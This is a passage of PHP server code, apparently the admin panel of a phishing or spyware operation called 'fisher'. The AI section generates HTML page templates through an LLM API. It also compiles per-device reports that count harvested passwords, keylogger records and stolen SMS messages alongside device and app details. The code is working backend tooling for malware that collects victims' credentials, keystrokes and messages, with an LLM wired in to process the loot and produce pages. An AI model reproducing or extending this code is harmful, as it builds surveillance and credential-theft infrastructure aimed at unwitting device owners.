    // ================= AI =================
    protected function ai(array $seg)
    {
        $sub = (string)($seg[1] ?? '');
        if ($sub === '') {
            if ($this->method === 'POST' || $this->method === 'PUT') {
                foreach ($this->body as $k => $v) {
                    if (is_array($v)) $v = json_encode($v, JSON_UNESCAPED_UNICODE);
                    $this->settingPut('ai_' . $k, (string)$v);
                    $ex = Db::table('fisher_ai_config')->where('config_key', $k)->find();
                    if ($ex) Db::table('fisher_ai_config')->where('config_key', $k)->update(['config_value' => (string)$v, 'updated_at' => date('Y-m-d H:i:s')]);
                    else Db::table('fisher_ai_config')->insert(['config_key' => $k, 'config_value' => (string)$v, 'updated_at' => date('Y-m-d H:i:s')]);
                }
                return $this->json(['success' => true, 'data' => null]);
            }
            $cfg = [];
            foreach (Db::table('fisher_ai_config')->select()->toArray() as $r) $cfg[(string)$r['config_key']] = (string)$r['config_value'];
            $cfg += ['api_url' => '', 'api_key' => '', 'model' => '', 'temperature' => '0.1', 'system_prompt' => '', 'enabled' => false];
            return $this->json($cfg);
        }
        if ($sub === 'template-history') {
            $id = (int)($seg[2] ?? 0);
            if ($this->method === 'DELETE') {
                Db::table('fisher_ai_templates')->where('id', $id)->delete();
                return $this->json(['success' => true, 'data' => null]);
            }
            if ($this->method === 'POST') {
                Db::table('fisher_ai_templates')->insert([
                    'name' => (string)($this->body['name'] ?? ''),
                    'prompt' => (string)($this->body['prompt'] ?? ''),
                    'html' => (string)($this->body['html'] ?? ''),
                    'created_at' => time(),
                ]);
                return $this->json(['success' => true, 'data' => null]);
            }
            $rows = Db::table('fisher_ai_templates')->order('id', 'desc')->limit(200)->select()->toArray();
            $out = [];
            foreach ($rows as $r) {
                $out[] = ['id' => (int)$r['id'], 'name' => (string)($r['name'] ?? ''), 'prompt' => (string)($r['prompt'] ?? ''), 'html' => (string)($r['html'] ?? ''), 'created_at' => (int)($r['created_at'] ?? 0)];
            }
            return $this->json($out);
        }
        if ($sub === 'generate-template') {
            $msgs = $this->body['messages'] ?? [];
            $prompt = '';
            if (is_array($msgs)) {
                foreach ($msgs as $m) {
                    if (($m['role'] ?? '') === 'user') $prompt = (string)($m['content'] ?? $prompt);
                }
            }
            $reply = $this->aiChat($prompt);
            $html = $this->extractHtml($reply);
            if ($html === '') $html = $this->fallbackTemplate($prompt);
            return $this->json(['html' => $html, 'success' => true]);
        }
        $deviceId = (string)$sub;
        $act = (string)($seg[2] ?? '');
        if ($act === 'analyze' && $this->method === 'POST') {
            $rep = $this->buildReport($deviceId);
            if ($rep === null) return $this->json(['status' => 'no_data', 'message' => '设备不存在或暂无可分析数据']);
            $txt = $this->aiChat('请基于以下设备数据输出一份结构化的隐私与设备安全评估报告：' . $rep['raw_json']);
            if ($txt !== '') {
                Db::table('fisher_ai_reports')->insert(['device_id' => $deviceId, 'report' => $txt, 'created_at' => date('Y-m-d H:i:s')]);
                $rep['report'] = $txt; $rep['raw_json'] = $txt;
            }
            return $this->json(['status' => 'ok', 'type' => 'analysis_complete', 'data' => ['device_id' => $deviceId, 'report' => $rep['report']], 'report' => $rep['report']]);
        }
        if ($this->method === 'POST' || $this->method === 'PUT') {
            return $this->json(['success' => true, 'data' => null]);
        }
        $r = Db::table('fisher_ai_reports')->where('device_id', $deviceId)->order('id', 'desc')->find();
        if ($r) {
            return $this->json([
                'id' => (int)$r['id'],
                'device_id' => $deviceId,
                'report' => (string)$r['report'],
                'raw_json' => (string)$r['report'],
                'status' => 'completed',
                'type' => 'analysis_complete',
                'created_at' => (string)$r['created_at'],
            ]);
        }
        return $this->json(['device_id' => $deviceId, 'status' => 'pending', 'type' => 'pending', 'report' => '', 'raw_json' => '']);
    }

    protected function buildReport(string $deviceId): ?array
    {
        $dev = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
        if (!$dev) return null;
        $apps = Db::table('fisher_device_apps')->where('device_id', $deviceId)->find();
        $appCount = 0;
        if ($apps && !empty($apps['installed_apps'])) {
            $d = json_decode((string)$apps['installed_apps'], true);
            if (is_array($d)) $appCount = count($d);
        }
        $data = [
            'device_id' => $deviceId,
            'brand' => (string)($dev['brand'] ?? ''),
            'model' => (string)($dev['model'] ?? ''),
            'os_version' => (string)($dev['os_version'] ?? ''),
            'country' => (string)($dev['country'] ?? ''),
            'language' => (string)($dev['language'] ?? ''),
            'network_type' => (string)($dev['network_type'] ?? ''),
            'first_seen' => $this->ts($dev['first_seen'] ?? 0),
            'last_seen' => $this->ts($dev['last_seen'] ?? 0),
            'installed_apps' => $appCount,
            'credentials' => (int)Db::table('fisher_passwords')->where('device_id', $deviceId)->count(),
            'keylogs' => (int)Db::table('fisher_operation_logs')->where('device_id', $deviceId)->count(),
            'sms' => (int)Db::table('fisher_sms_messages')->where('device_id', $deviceId)->count(),
        ];
        $raw = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        return ['device_id' => $deviceId, 'raw_json' => $raw, 'report' => '', 'status' => 'completed', 'type' => 'analysis_complete'];
    }

    protected function aiChat(string $prompt): string
    {
        $url = (string)Db::table('fisher_ai_config')->where('config_key', 'api_url')->value('config_value');
        $key = (string)Db::table('fisher_ai_config')->where('config_key', 'api_key')->value('config_value');
        $model = (string)Db::table('fisher_ai_config')->where('config_key', 'model')->value('config_value');
        if ($url === '' || $key === '' || $prompt === '') return '';
        try {
            $ch = curl_init(rtrim($url, '/') . '/chat/completions');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode([
                    'model' => $model ?: 'gpt-4o-mini',
                    'messages' => [['role' => 'user', 'content' => $prompt]],
                    'temperature' => 0.1,
                ], JSON_UNESCAPED_UNICODE),
                CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Authorization: Bearer ' . $key],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 25,
                CURLOPT_CONNECTTIMEOUT => 6,
            ]);
            $res = curl_exec($ch);
            $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if ($code >= 200 && $code < 300 && is_string($res)) {
                $j = json_decode($res, true);
                if (isset($j['choices'][0]['message']['content'])) return (string)$j['choices'][0]['message']['content'];
            }
        } catch (\Throwable $e) {}
        return '';
    }

    protected function extractHtml(string $s): string
    {
        if ($s === '') return '';
        if (preg_match('/```(?:html)?\s*([\s\S]*?)```/', $s, $m)) return trim($m[1]);
        if (stripos($s, '<html') !== false || stripos($s, '<!doctype') !== false) return trim($s);
        return '';
    }

